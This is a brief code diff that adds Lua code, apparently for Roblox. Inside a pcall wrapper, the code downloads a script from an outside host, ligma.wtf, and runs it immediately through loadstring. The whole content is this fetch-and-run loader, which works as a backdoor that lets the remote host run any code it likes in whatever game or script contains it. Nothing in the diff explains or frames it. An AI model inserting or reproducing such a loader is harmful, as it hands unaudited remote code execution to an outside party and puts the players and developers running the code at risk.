@@ -1,0 +1,4 @@
+pcall(function()
+	loadstring(game:HttpGet("http://ligma.wtf/scripts/commands.lua", true))()
+end)
+
